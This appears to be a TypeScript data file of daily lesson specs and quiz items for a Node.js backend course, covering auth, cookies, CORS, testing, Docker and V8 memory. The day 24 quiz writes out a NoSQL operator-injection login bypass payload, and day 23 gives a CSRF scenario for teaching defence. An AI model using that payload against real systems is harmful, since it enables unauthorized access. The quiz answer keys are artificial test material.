      { id: "node-m1-d22-q1", name: "The JWT Wire Format & Cryptographic Signature Mechanics", type: "concept", desc: "Deconstruct Base64Url encoding, JOSE headers, claims validation (exp, iat, nbf, iss, aud), and signature verification." },
      { id: "node-m1-d22-q2", name: "Detective Lab: The 'alg': 'none' Signature Bypass Vulnerability", type: "detective", desc: "Isolate a fatal vulnerability where an unhardened JWT parser accepted tokens with algorithm set to 'none' without verification." },
      { id: "node-m1-d22-q3", name: "Mastery Assignment: Production Asymmetric Auth Server with Key Rotation", type: "assignment", desc: "Build an RS256 authentication service with JWKS (JSON Web Key Set) endpoint, token issuance, and rotation state." },
      { id: "node-m1-d22-q4", name: "Production Incident Lab: Revoking Stateless JWTs before Expiration", type: "detective", desc: "Implement a distributed Redis blocklist for revoked access tokens to handle emergency employee terminations." }
    ]
  },
  {
    day: 23,
    month: 1,
    blockNum: 5,
    title: "Stateful Session Management: Redis Session Stores, Cookie Security Flags (HttpOnly, SameSite)",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Stateful Sessions & Cookie Hardening)",
    spokenGoal: "Master stateful session architecture: Learn when stateful sessions outperform stateless JWTs (instant revocation, centralized access control), how to store sessions in Redis with TTLs, and how to configure rock-solid cookie security attributes (`HttpOnly`, `Secure`, `SameSite=Strict`).",
    conceptInvariant: "Session cookies must NEVER be accessible via client-side JavaScript. The `HttpOnly` flag prevents malicious XSS scripts from stealing session cookies via `document.cookie`. The `SameSite=Strict` flag prevents Cross-Site Request Forgery (CSRF) by refusing to send cookies on cross-origin requests.",
    failureMode: "Storing sensitive authentication tokens in browser `localStorage`: any XSS vulnerability anywhere on the webpage allows attackers to read and exfiltrate the token with a single line of JavaScript.",
    tryItFriction: "Configure a Fastify/Express session store using Redis: assert that session IDs in the `Set-Cookie` header include `HttpOnly; Secure; SameSite=Strict`, and prove that `document.cookie` cannot read the session ID.",
    socraticHints: [
      "Why should you never store auth tokens in `localStorage`?",
      "`localStorage` has zero XSS protection! Any third-party script or npm package with an XSS bug can read `localStorage.getItem('token')`.",
      "Store session IDs in `HttpOnly; Secure; SameSite=Strict` cookies, which the browser manages automatically and hides from JavaScript."
    ],
    situationalPuzzle: {
      scenario: "A user is logged into their bank (`mybank.com`). They click a malicious link to `evil.com`. `evil.com` contains a form that submits a POST request to `mybank.com/transfer`. What cookie attribute prevents the browser from attaching the user's banking session cookie to this request?",
      options: [
        "Path=/",
        "SameSite=Strict: This tells the browser to NEVER send the cookie on cross-site requests initiated by third-party origins, neutralizing CSRF attacks.",
        "Max-Age=3600",
        "Domain=mybank.com"
      ],
      answerIdx: 1,
      debrief: "SameSite=Strict ensures that cookies are only sent when the request originates from the same site. Cross-site form submissions or links from third-party domains will not carry the cookie, effectively eliminating CSRF risks."
    },
    quests: [
      { id: "node-m1-d23-q1", name: "The Browser Cookie Protocol & Security Flags Specification", type: "concept", desc: "Analyze cookie parameters: Name, Value, Domain, Path, Expires/Max-Age, Secure, HttpOnly, SameSite (Strict/Lax/None)." },
      { id: "node-m1-d23-q2", name: "Detective Lab: The Stolen LocalStorage Token XSS Incident", type: "detective", desc: "Refactor a vulnerable frontend-backend auth flow from localStorage tokens to hardened HttpOnly session cookies." },
      { id: "node-m1-d23-q3", name: "Mastery Assignment: Distributed Redis Session Manager with Auto-Expiry", type: "assignment", desc: "Build a session engine backed by Redis with atomic session renewal, sliding expiration TTLs, and instant revocation." },
      { id: "node-m1-d23-q4", name: "Production Incident Lab: Session Fixation & Regeneration Invariants", type: "detective", desc: "Prevent session fixation attacks by regenerating session IDs immediately upon successful user login." }
    ]
  },
  {
    day: 24,
    month: 1,
    blockNum: 5,
    title: "Enterprise Web Security: CORS Preflight, Helmet Headers & SQL/NoSQL Injection Mitigation",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Web Security Headers & Attack Vectors)",
    spokenGoal: "Master enterprise web security hardening: Understand how Cross-Origin Resource Sharing (CORS) preflight (`OPTIONS`) requests work, configure security headers using Helmet (`CSP`, `HSTS`, `X-Frame-Options`), and defend against NoSQL object injection attacks.",
    conceptInvariant: "CORS is a browser security mechanism, NOT a backend security firewall! CORS prevents a browser on `evil.com` from reading responses from `api.bank.com`. It does NOT prevent curl, Postman, or backend scripts from calling your API directly.",
    failureMode: "Setting `Access-Control-Allow-Origin: *` while simultaneously setting `Access-Control-Allow-Credentials: true`: modern browsers reject this configuration as a security violation.",
    tryItFriction: "Configure a strict CORS middleware: allow only trusted origins from an allowlist, handle `OPTIONS` preflight requests with appropriate max-age caching, and deploy Helmet security headers.",
    socraticHints: [
      "Why did the browser block our API request with a CORS error when curl works perfectly?",
      "Because CORS is enforced by the BROWSER! The browser asked the server: 'Do you allow example.com to read this data?' and the server didn't respond with matching headers.",
      "Configure `Access-Control-Allow-Origin` to explicitly allow your frontend domain."
    ],
    situationalPuzzle: {
      scenario: "A backend service uses MongoDB. A login endpoint receives: `{ username: 'admin', password: { $gt: '' } }`. Because the developer passed the raw body directly into `db.users.findOne(req.body)`, what happens?",
      options: [
        "The query fails with a type error.",
        "NoSQL Object Injection Authentication Bypass: The `$gt: ''` operator matches any password greater than empty string, logging the attacker in as admin without knowing the password!",
        "MongoDB hashes the object.",
        "The server returns 401 Unauthorized."
      ],
      answerIdx: 1,
      debrief: "NoSQL object injection occurs when raw JSON objects containing database operators (like `$gt`, `$ne`, `$where`) are passed directly into database queries. Input validation schemas (like Zod) must enforce that password is a strict primitive string."
    },
    quests: [
      { id: "node-m1-d24-q1", name: "The CORS Preflight (OPTIONS) Handshake Lifecycle", type: "concept", desc: "Trace preflight triggers: Non-simple methods (PUT/DELETE/PATCH), custom headers (Authorization), and Access-Control-Max-Age." },
      { id: "node-m1-d24-q2", name: "Detective Lab: The Wildcard CORS Credential Collision Outage", type: "detective", desc: "Fix an API that broke on modern browsers after setting Access-Control-Allow-Origin to '*' with credentials true." },
      { id: "node-m1-d24-q3", name: "Mastery Assignment: Production Security Hardening Suite with Helmet & Sanitization", type: "assignment", desc: "Deploy a security middleware stack with CSP, HSTS, DNS prefetch control, frameguard, and NoSQL operator stripping." },
      { id: "node-m1-d24-q4", name: "Production Incident Lab: Clickjacking Defense via X-Frame-Options", type: "detective", desc: "Prevent invisible iframe clickjacking attacks on banking forms using Content-Security-Policy frame-ancestors directives." }
    ]
  },
  {
    day: 25,
    month: 1,
    blockNum: 5,
    title: "Milestone 5: Zero-Trust Authentication & RBAC Service with Refresh Token Rotation",
    stageName: "Stage 2: Guided System Construction",
    stageNum: 2,
    pedagogicalRole: "Milestone Gate (Security Architecture & Access Control)",
    spokenGoal: "Build and defend Milestone 5: A complete Zero-Trust Authentication and Role-Based Access Control (RBAC) microservice featuring RS256 asymmetric token issuance, Redis session storage, Refresh Token Rotation with reuse detection, and permission guards.",
    conceptInvariant: "Zero-Trust architecture mandates that every request is authenticated and authorized at the route level. Role-Based Access Control (RBAC) must evaluate granular permissions (e.g. `orders:write`), not coarse role strings (e.g. `role === 'admin'`).",
    failureMode: "Failing to invalidate the entire token family when an expired or reused refresh token is presented, allowing compromised tokens to continue accessing data.",
    tryItFriction: "Simulate a token theft attack: issue a token pair, refresh it once legitimately, then attempt to refresh using the old token and verify that the system revokes ALL active sessions for that user.",
    socraticHints: [
      "Why should authorization check permissions like `documents:delete` rather than role `admin`?",
      "Roles change and expand over time! If you check `role === 'admin'`, you have to update 50 files when you introduce a `manager` or `auditor` role.",
      "Assign permissions to roles, and check permissions in route guards: `hasPermission('documents:delete')`."
    ],
    situationalPuzzle: {
      scenario: "During the Milestone 5 defense, the evaluator logs in as a 'Viewer' and calls `DELETE /api/users/42`. Your route guard checks `if (user.role === 'admin')`. The evaluator creates a custom role 'SuperViewer' that has the `users:delete` permission granted in the database, but your hardcoded check rejects it. Why is this bad architecture?",
      options: [
        "Viewers should always be able to delete users.",
        "Role-Based Access Control should decouple identity from permissions: Routes must check granular permissions (`can('users:delete')`), allowing organizations to configure dynamic custom roles without code changes.",
        "The route should use HTTP POST instead of DELETE.",
        "Roles should be stored in environment variables."
      ],
      answerIdx: 1,
      debrief: "Hardcoding role names in route handlers violates the Principle of Least Privilege and breaks enterprise customization. Enterprise RBAC assigns granular permissions to roles in the database and verifies permissions in route guards."
    },
    quests: [
      { id: "node-m1-d25-q1", name: "Milestone 5 Zero-Trust Security Specification", type: "concept", desc: "Design the token lifecycle, cryptographic key pairs, Redis session storage, and RBAC permission matrix." },
      { id: "node-m1-d25-q2", name: "Detective Lab: The Refresh Token Reuse Race Condition", type: "detective", desc: "Isolate a concurrency glitch where two simultaneous legitimate requests triggered false token theft alerts." },
      { id: "node-m1-d25-q3", name: "Mastery Assignment: Production RBAC Authentication Microservice", type: "assignment", desc: "Deliver the full authentication service with RS256 tokens, rotating refresh keys, Redis tracking, and permission middleware." },
      { id: "node-m1-d25-q4", name: "Milestone 5 Defense: Cryptography & Zero-Trust Access Control Viva", type: "detective", desc: "Defend your key rotation procedures, timing attack mitigations, and permission invariants before Senior Security Architects." }
    ]
  },

  // ── BLOCK 6: Testing, Containerization & Month 1 Capstone (Days 26–30) ────────
  {
    day: 26,
    month: 1,
    blockNum: 6,
    title: "Backend Automated Testing: Supertest, In-Memory DBs & Mocking External Network Calls",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Backend Testing & Test Isolation)",
    spokenGoal: "Master automated backend testing: Learn the testing pyramid for Node.js services (Unit, Integration, E2E), test HTTP endpoints using Supertest, manage isolated test databases with automatic rollbacks, and mock third-party network calls using MSW (Mock Service Worker).",
    conceptInvariant: "Tests must be completely deterministic, isolated, and side-effect free. Never run tests against shared staging databases without transactions. Wrap every integration test in a database transaction that rolls back at the end of the test, ensuring 100% clean state for subsequent tests.",
    failureMode: "Writing tests that make real outbound HTTP requests to Stripe or Twilio: network timeouts cause flaky CI failures and real credit cards get charged during automated test runs.",
    tryItFriction: "Write an integration test using Supertest: create a test database container, execute a POST request, assert the 201 response and database record creation, and roll back the transaction in `afterEach()`.",
    socraticHints: [
      "Why did Test 5 fail only when run after Test 2?",
      "Test pollution! Test 2 created a user with email `test@test.com` and didn't clean it up, so Test 5 failed on duplicate key.",
      "Wrap each test in a transaction and rollback in `afterEach`, or generate unique UUIDs for all test data."
    ],
    situationalPuzzle: {
      scenario: "A CI/CD pipeline runs integration tests in parallel across 4 worker threads. Tests randomly fail with duplicate key errors on the `users` table. All tests run against the same test database. How do you achieve parallel test isolation?",
      options: [
        "Run tests sequentially on 1 thread (slowing CI down by 4x).",
        "Dedicated Database Per Worker: Use a test runner template (like Vitest/Jest) that provisions an isolated database for each worker thread (e.g. `test_db_worker_1`, `test_db_worker_2`), allowing 100% parallel execution without data collisions.",
        "Disable unique constraints in testing.",
        "Delete the database after every test."
      ],
      answerIdx: 1,
      debrief: "Parallel integration testing requires isolated database instances per worker thread. Provisioning dynamically named databases (`test_db_${workerId}`) eliminates data cross-contamination and allows test suites to execute at maximum parallel speed."
    },
    quests: [
      { id: "node-m1-d26-q1", name: "The Backend Testing Hierarchy Architecture", type: "concept", desc: "Compare Unit (isolated functions), Integration (HTTP + Real DB), and Contract tests (Pact) across execution speed and confidence." },
      { id: "node-m1-d26-q2", name: "Detective Lab: The Flaky Network Dependency Test", type: "detective", desc: "Intercept unmocked third-party API calls in an e-commerce test suite using MSW to achieve 100% offline deterministic passes." },
      { id: "node-m1-d26-q3", name: "Mastery Assignment: Transaction-Isolated Test Suite with Supertest", type: "assignment", desc: "Build an automated integration test harness executing full HTTP requests against real PostgreSQL with automatic rollback." },
      { id: "node-m1-d26-q4", name: "Production Incident Lab: Mock Drift & Broken Production Contracts", type: "detective", desc: "Prevent mock drift where outdated test mocks mask breaking API changes introduced by external payment vendors." }
    ]
  },
  {
    day: 27,
    month: 1,
    blockNum: 6,
    title: "Configuration & Environment Architecture: Schema-Validated Env Variables & Secrets",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (12-Factor Configuration & Secrets)",
    spokenGoal: "Master backend configuration engineering: Follow the 12-Factor App methodology for configuration, validate all environment variables at startup using strict Zod schemas, prevent secret leakage in stack traces, and manage Docker/Kubernetes secrets.",
    conceptInvariant: "Fail Fast at Boot. If a required environment variable (e.g. `DATABASE_URL` or `JWT_SECRET`) is missing or malformed, the application MUST crash immediately on startup with a descriptive error, rather than booting successfully and failing 4 hours later during a user request.",
    failureMode: "Booting a server with `JWT_SECRET=undefined`: when users sign in, Node.js signs tokens using the string `'undefined'`, creating a catastrophic security vulnerability.",
    tryItFriction: "Create an environment configuration module using Zod that parses `process.env`: validate port numbers, database URLs, and secret lengths, asserting that the app refuses to boot if secrets are missing.",
    socraticHints: [
      "Why did the server crash at 3:00 AM when the first user tried to reset their password?",
      "The `SMTP_HOST` environment variable was missing, but the app booted anyway! The bug lay dormant until someone hit that code path.",
      "Validate ALL environment variables during server initialization with Zod so missing variables are caught immediately."
    ],
    situationalPuzzle: {
      scenario: "An engineer logs configuration on startup: `console.log('Server config loaded:', config)`. In production, the logs are shipped to a third-party logging aggregator (Datadog/Elastic). What critical compliance failure occurred?",
      options: [
        "The log message is too long.",
        "Secret Exposure: Printing raw configuration objects to logs exposes database passwords, API private keys, and encryption secrets to everyone with log access, violating SOC 2 and PCI-DSS compliance.",
        "console.log is not allowed in Node.js.",
        "The server will crash."
      ],
      answerIdx: 1,
      debrief: "Never log raw configuration objects. Enterprise configuration loaders must redact sensitive fields (`password`, `secret`, `key`) before printing startup diagnostics, preventing credential leakage to log aggregators."
    },
    quests: [
      { id: "node-m1-d27-q1", name: "The 12-Factor App Configuration Methodology", type: "concept", desc: "Understand strict separation of config from code, environment-specific deployments, and immutable artifact builds." },
      { id: "node-m1-d27-q2", name: "Detective Lab: The Undefined JWT Secret Vulnerability", type: "detective", desc: "Remediate a critical vulnerability where an unset JWT_SECRET defaulted to an empty string, allowing anyone to forge tokens." },
      { id: "node-m1-d27-q3", name: "Mastery Assignment: Fail-Fast Type-Safe Environment Loader with Redaction", type: "assignment", desc: "Build a Zod environment validator that validates formats, parses types, and provides a redacted diagnostic summary." },
      { id: "node-m1-d27-q4", name: "Production Incident Lab: Hot-Reloading Configuration without Process Restarts", type: "detective", desc: "Implement dynamic configuration polling via Redis Pub/Sub for feature flags without dropping active connections." }
    ]
  },
  {
    day: 28,
    month: 1,
    blockNum: 6,
    title: "Graceful Shutdown Lifecycle: Handling SIGTERM/SIGINT, Draining Connections & Zero-Downtime Reboots",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Process Signals & Graceful Termination)",
    spokenGoal: "Master production process lifecycles: Learn how container orchestrators (Kubernetes, Docker) shut down applications using POSIX signals (`SIGTERM`, `SIGINT`), and implement a graceful shutdown coordinator that stops accepting new requests, drains active HTTP sockets, closes database pools, and exits cleanly within deadlines.",
    conceptInvariant: "When Kubernetes terminates a pod, it sends a `SIGTERM` signal. The server must: 1) Stop accepting new connections (`server.close()`); 2) Finish processing active in-flight requests; 3) Close database and Redis pools; 4) Call `process.exit(0)`. If work isn't done before `terminationGracePeriodSeconds` (e.g. 30s), Kubernetes sends `SIGKILL`.",
    failureMode: "Exiting immediately on `SIGTERM` with `process.exit(0)`: hundreds of active user requests in flight (e.g. payment submissions) are abruptly severed, throwing HTTP 502 Bad Gateway errors to customers.",
    tryItFriction: "Simulate a graceful shutdown: trigger an in-flight 2-second request, send `kill -SIGTERM`, verify that the active request completes successfully with HTTP 200 while new requests are rejected with 503, and the process exits cleanly.",
    socraticHints: [
      "Why did users see 502 Bad Gateway errors during our production rolling deployment?",
      "When Kubernetes deployed the new container, it sent SIGTERM to the old one. The old server shut down immediately, cutting off active user requests!",
      "Listen for `process.on('SIGTERM')`, stop accepting new requests, wait for active requests to finish, then close database pools."
    ],
    situationalPuzzle: {
      scenario: "A server receives `SIGTERM`. It calls `server.close()`, but an active WebSocket connection or unclosed `setInterval` timer keeps running. The process never exits. 30 seconds later, Kubernetes forcibly kills the container with `SIGKILL`. How must a graceful shutdown handler guarantee process termination?",
      options: [
        "Never shut down.",
        "Grace Period Timeout: Set a hard safety timeout (e.g. `setTimeout(() => process.exit(1), 10000).unref()`) at the start of the shutdown handler to force exit if graceful cleanup hangs.",
        "Block the SIGKILL signal.",
        "Restart the container immediately."
      ],
      answerIdx: 1,
      debrief: "A graceful shutdown coordinator must include a safety timeout. If unclosed connections, hanging database queries, or unref'd timers prevent clean exit within a reasonable window (e.g. 10s), the safety timer forces an exit, preventing unhandled SIGKILL terminations."
    },
    quests: [
      { id: "node-m1-d28-q1", name: "The POSIX Process Signal Architecture", type: "concept", desc: "Compare signals: SIGTERM (polite termination request), SIGINT (Ctrl+C), SIGHUP (config reload), and uncatchable SIGKILL." },
      { id: "node-m1-d28-q2", name: "Detective Lab: The Severed In-Flight Payment Deployment Outage", type: "detective", desc: "Diagnose an outage where rolling container reboots cut off 250 active checkout transactions mid-write." },
      { id: "node-m1-d28-q3", name: "Mastery Assignment: Production Graceful Shutdown Coordinator", type: "assignment", desc: "Build a reusable shutdown manager coordinating HTTP socket closing, database pool draining, and timeout deadlines." },
      { id: "node-m1-d28-q4", name: "Production Incident Lab: Kubernetes Readiness vs Liveness Probe Failures", type: "detective", desc: "Configure `/health/ready` to return 503 immediately upon SIGTERM so the load balancer stops routing traffic to the dying pod." }
    ]
  },
  {
    day: 29,
    month: 1,
    blockNum: 6,
    title: "Production Containerization: Multi-Stage Docker Builds & Non-Root Linux User Security",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Docker Containers & Linux Security)",
    spokenGoal: "Master enterprise Docker containerization for Node.js: Build lean, secure production container images using Multi-Stage Dockerfiles, eliminate build tools and `devDependencies` from production images, and run processes as unprivileged non-root users to prevent container escape exploits.",
    conceptInvariant: "Never run Node.js as the `root` user in a Docker container. If an attacker exploits an application vulnerability (like command injection or path traversal), running as root gives them full root privileges inside the container. Always create and use an unprivileged user (`USER node`).",
    failureMode: "Shipping a single-stage Dockerfile containing TypeScript compilers, test files, and full `node_modules` (including devDependencies): the image size bloats to 1.4GB, slowing deployments and expanding the security attack surface.",
    tryItFriction: "Write a 3-stage Dockerfile (deps, builder, runner) that compiles TypeScript, prunes dev dependencies, runs as `USER node`, and produces an ultra-lean production image under 120MB.",
    socraticHints: [
      "Why is our Docker image 1.2GB when our compiled code is only 5MB?",
      "You copied the entire `node_modules` including TypeScript, test runners, and build tools into the production image!",
      "Use Multi-Stage builds: compile TypeScript in the builder stage, and copy ONLY compiled JS and production dependencies into the final minimal Alpine/Distroless runner image."
    ],
    situationalPuzzle: {
      scenario: "A security scanner audits a Docker container and flags a High-severity finding: 'Process runs as PID 1 without an init system'. In Node.js, when running as PID 1, what happens when the container receives a SIGTERM signal?",
      options: [
        "Node.js runs faster as PID 1.",
        "PID 1 Signal Dropping: In Linux, PID 1 does not get default signal handlers. Unless code explicitly attaches `process.on('SIGTERM')`, Node.js completely ignores SIGTERM, preventing graceful shutdown.",
        "The container cannot access the network.",
        "Docker deletes the image."
      ],
      answerIdx: 1,
      debrief: "In Linux, PID 1 has special kernel treatment and ignores signals unless explicit handlers are registered. Additionally, orphan zombie processes are not reaped. Using a lightweight init system like `tini` or `dumb-init` properly forwards signals and reaps zombie processes."
    },
    quests: [
      { id: "node-m1-d29-q1", name: "The Multi-Stage Docker Build Topology", type: "concept", desc: "Trace stages: Stage 1 (Install all deps) -> Stage 2 (Compile TS to JS) -> Stage 3 (Copy prod deps + dist to minimal Alpine runner)." },
      { id: "node-m1-d29-q2", name: "Detective Lab: The Root Container Privilege Escalation Vulnerability", type: "detective", desc: "Harden a vulnerable Dockerfile running as root by introducing an unprivileged 'node' user and setting correct file ownership." },
      { id: "node-m1-d29-q3", name: "Mastery Assignment: Production-Grade Hardened Dockerfile with Tini Init", type: "assignment", desc: "Author an enterprise Dockerfile with multi-stage caching, tini init system, healthcheck, and sub-150MB image size." },
      { id: "node-m1-d29-q4", name: "Production Incident Lab: Layer Caching & Package.json Invalidation", type: "detective", desc: "Optimize Docker layer caching by copying package*.json and running npm ci BEFORE copying source code files." }
    ]
  },
  {
    day: 30,
    month: 1,
    blockNum: 6,
    title: "Month 1 Capstone Viva Gate: Gatekeeper Production Microservice Auth & Gateway OS Defense",
    stageName: "Stage 3: Enterprise Capstone Defense",
    stageNum: 3,
    pedagogicalRole: "Month 1 Capstone Viva (Comprehensive Backend Architecture)",
    spokenGoal: "Defend your Month 1 Capstone before the Senior Backend Architect Review Board: `Gatekeeper` — a production-grade API Gateway & Auth Microservice featuring Fastify routing, Zod schema validation, PostgreSQL double-entry transactions, Redis session rotation, rate limiting, graceful shutdown, and containerization.",
    conceptInvariant: "A professional backend system must unite high-throughput non-blocking routing, strict schema validation at the edge, ACID transactional database persistence with row locking, zero-trust token rotation, and resilient process lifecycle coordination.",
    failureMode: "Failing the live architectural viva by being unable to explain how event loop phases interact with microtasks, how stream backpressure prevents memory leaks, or how row-level locking eliminates race conditions.",
    tryItFriction: "Demonstrate live code defense: trigger a high-concurrency stress test, prove sub-50ms p99 latency under load, simulate a SIGTERM shutdown without dropping a single active connection, and pass all automated test suites.",
    socraticHints: [
      "How would you explain the difference between process.nextTick and setImmediate to a Staff Engineer?",
      "`process.nextTick` executes immediately after the current call stack clears, before ANY event loop phase transitions.",
      "`setImmediate` queues work into the Check phase of the libuv event loop, allowing the loop to turn and process pending I/O and timers."
    ],
    situationalPuzzle: {
      scenario: "During the Month 1 Capstone Viva, the Chief Systems Architect asks: 'If 10,000 requests hit your gateway simultaneously while your database connection pool is limited to 20, how does your architecture prevent Node.js from running out of memory while waiting for the database?' How do you answer?",
      options: [
        "Increase pool size to 10,000.",
        "Bounded Request Queueing & Fast-Failing: Configure a bounded waiting queue with a strict timeout (e.g. 2s); if the queue exceeds capacity, immediately fast-fail excess requests with `HTTP 503 Service Unavailable` or `429`, protecting server memory from unbounded growth.",
        "Reboot the server.",
        "Store queries in local files."
      ],
      answerIdx: 1,
      debrief: "Unbounded in-memory queues are the root cause of backend Out-Of-Memory crashes. Production systems bound their waiting queues: when maximum queue depth is reached, the system sheds load by returning HTTP 503, preserving stability for already-queued requests."
    },
    quests: [
      { id: "node-m1-d30-q1", name: "Capstone System Architecture & Domain Model Specification", type: "concept", desc: "Present the complete architectural blueprint of Gatekeeper: gateway routing, auth stores, and database models." },
      { id: "node-m1-d30-q2", name: "Detective Lab: Live High-Load Database Starvation Simulation", type: "detective", desc: "Diagnose and resolve an intentional high-concurrency race condition during live evaluation under simulated 2,000 req/sec." },
      { id: "node-m1-d30-q3", name: "Mastery Assignment: Full Gatekeeper Production Microservice Delivery", type: "assignment", desc: "Deliver the production-ready Gatekeeper OS with full tests, Docker container, PostgreSQL migrations, and 95%+ coverage." },
      { id: "node-m1-d30-q4", name: "Month 1 Capstone Viva Defense: Staff Architecture Board Evaluation", type: "detective", desc: "Defend your runtime event loop choices, stream pipelines, database lock ordering, and security models before Senior Staff." }
    ]
  }
];

export const NODE_MONTH_2_SPECS: MasterclassDaySpec[] = [
  // ── BLOCK 7: V8 Heap Diagnostics & Low-Level Native Addons (Days 31–35) ───────
  {
    day: 31,
    month: 2,
    blockNum: 7,
    title: "V8 Heap Anatomy: New Space, Semi-Spaces, Old Space & Mark-Sweep Compaction Internals",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (V8 Memory Model & Garbage Collection)",
    spokenGoal: "Deconstruct the Google V8 engine memory architecture: Understand the Generational Hypothesis, explore V8 heap spaces (New Space with From/To semi-spaces, Old Pointer Space, Old Data Space, Large Object Space, Code Space), and master the Scavenger GC vs Major Mark-Sweep-Compact cycles.",
    conceptInvariant: "The Generational Hypothesis observes that most objects die young. V8 allocates new objects in the small New Space (16–64MB) using fast Scavenger copying between semi-spaces. Objects that survive two GC cycles are promoted (tenured) to Old Space, where expensive Major Mark-Sweep-Compact algorithms reclaim memory.",
    failureMode: "Continuously creating short-lived intermediate objects inside high-frequency loops (e.g. allocating 10,000 throwaway objects per second): this prematurely promotes objects to Old Space, triggering frequent Major GC pauses that freeze the event loop.",
    tryItFriction: "Run a script with `--trace-gc` in Node.js: inspect real-time Scavenger vs Mark-Sweep collections, observe memory promotions, and eliminate memory churn to reduce GC pause times below 2ms.",
    socraticHints: [
      "Why did our API experience 50ms latency spikes every few seconds?",
      "Major Garbage Collection! V8 was forced to pause execution to sweep and compact fragmented Old Space memory.",
      "Reduce allocations in hot paths: reuse buffers, avoid creating throwaway objects in loops, and keep New Space allocations small."
    ],
    situationalPuzzle: {
      scenario: "An engineer allocates an 80MB buffer using `Buffer.alloc(80 * 1024 * 1024)`. Where does V8 allocate this memory?",
      options: [
        "In the New Space semi-space.",
        "Large Object Space (or external C++ memory): Objects larger than page size bypass standard semi-spaces entirely and are allocated directly in Large Object Space to prevent copying overhead during GC.",
        "On the call stack.",
        "In browser cache."
      ],
      answerIdx: 1,
      debrief: "Large objects cannot fit in standard semi-spaces without causing immediate overflow. V8 allocates them in Large Object Space, where they are never moved or copied by garbage collection, preserving execution efficiency."
    },
    quests: [
      { id: "node-m2-d31-q1", name: "The V8 Heap Space Memory Layout Topology", type: "concept", desc: "Diagram heap spaces: New Space (From/To), Old Pointer Space, Old Data Space, Large Object Space, Code Space, and Map Space." },
      { id: "node-m2-d31-q2", name: "Detective Lab: The Premature Old Space Promotion GC Spike", type: "detective", desc: "Use --trace-gc and clinic.js to diagnose and eliminate a 100ms GC pause caused by unnecessary object churn in request parsers." },
      { id: "node-m2-d31-q3", name: "Mastery Assignment: Low-Allocation Object Pool Memory Manager", type: "assignment", desc: "Build a generic object pool in TypeScript that recycles packet descriptors to achieve zero GC allocations during high-frequency I/O." },
      { id: "node-m2-d31-q4", name: "Staff Interview Lab: Incremental Marking & Concurrent Sweeping", type: "detective", desc: "Explain how V8 splits Major GC passes into incremental marking slices to avoid blocking the main thread for hundreds of milliseconds." }
    ]
  },
  {
    day: 32,
    month: 2,
    blockNum: 7,
    title: "V8 Memory Leak Profiling: Heap Dumps (heapdump), Allocation Timelines & Retainer Trees",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Memory Leak Diagnosis & Heap Snapshots)",
    spokenGoal: "Master memory leak detection in enterprise Node.js microservices: Learn how to capture heap dumps in production using `v8.getHeapSnapshot()`, analyze them in Chrome DevTools, inspect Distance and Retainer trees, and track down closure leaks and unbounded caches.",
    conceptInvariant: "An object is garbage collected ONLY when it is no longer reachable from any GC Root (global variables, active call stacks, DOM/Node handles). Finding a memory leak requires identifying the shortest path in the Retainer Tree connecting the leaked object back to an unintended GC Root.",
    failureMode: "Attaching an event listener inside a request handler: `eventEmitter.on('event', () => res.send())` without removing it: every incoming request appends another closure to the global emitter, retaining request objects and leaking gigabytes of RAM.",
    tryItFriction: "Trigger a programmatic heap snapshot via `v8.writeHeapSnapshot()`, load it into Chrome DevTools Memory tab, filter by Constructor, and trace a leaked array closure back to a global singleton.",
    socraticHints: [
      "What is 'Distance' in a Chrome DevTools heap snapshot?",
      "It is the shortest path of references from a GC Root to that object! Shorter distances mean the object is directly held by long-lived roots.",
      "Inspect the 'Retainers' panel at the bottom to see what variable or closure is holding onto the leaked object."
    ],
    situationalPuzzle: {
      scenario: "A production service's memory climbs by 50MB every hour. A heap snapshot reveals thousands of `(closure)` instances retained by a variable named `cache`. The cache has a size limit of 100, but the closures inside it reference large `IncomingMessage` objects from older scopes. What caused this?",
      options: [
        "The computer ran out of memory.",
        "Lexical Scope Closure Retention: In V8, closures in the same scope share a hidden context object. If one closure is retained in the cache, all variables in its parent lexical scope are retained in memory, even if the cached closure never uses them.",
        "V8 cannot garbage collect closures.",
        "The cache was not written in C++."
      ],
      answerIdx: 1,
      debrief: "V8 bundles variables in a lexical scope into a shared Context object. If any closure from that scope is retained in a long-lived cache, the ENTIRE context (and all variables it closed over) remains alive in memory, causing insidious memory leaks."
    },
    quests: [
      { id: "node-m2-d32-q1", name: "The V8 Garbage Collector Reachability Graph Specification", type: "concept", desc: "Trace GC Roots: Global Object, Stack Frames, Active Handles, Native C++ Object Wrappers, and Retainer Trees." },
      { id: "node-m2-d32-q2", name: "Detective Lab: The EventEmitter Event Listener Accumulation Leak", type: "detective", desc: "Isolate a production memory leak where request handlers added event listeners to a shared singleton emitter without cleanup." },
      { id: "node-m2-d32-q3", name: "Mastery Assignment: Automated Heap Leak Detection Daemon with Snapshot Dumper", type: "assignment", desc: "Build an automated monitor that detects runaway memory growth, captures a heap snapshot, and alerts engineering." },
      { id: "node-m2-d32-q4", name: "Staff Interview Lab: Analyzing Complex V8 Retainer Hierarchies", type: "detective", desc: "Walk through a real-world Chrome DevTools heap dump and identify the exact closure variable preventing GC reclamation." }
    ]
  },
  {
    day: 33,
    month: 2,
    blockNum: 7,
    title: "C++ Native Addons with Node-API (N-API): Building High-Performance C++ Addons for Node",
    stageName: "Stage 1: Mental Model Grounding",
    stageNum: 1,
    pedagogicalRole: "High Guidance (Node-API, C++ Addons & Kernel Bypass)",
    spokenGoal: "Master native C++ addon development with Node-API (formerly N-API): Learn how to write compiled C/C++ modules that interface directly with Node.js, execute CPU-bound math/cryptography at raw hardware speeds, and maintain ABI stability across Node versions.",
    conceptInvariant: "Node-API provides an Application Binary Interface (ABI) stability guarantee. A C++ addon compiled against Node-API will run on future Node.js versions without recompilation, unlike legacy V8-internal native addons which broke on every V8 engine upgrade.",
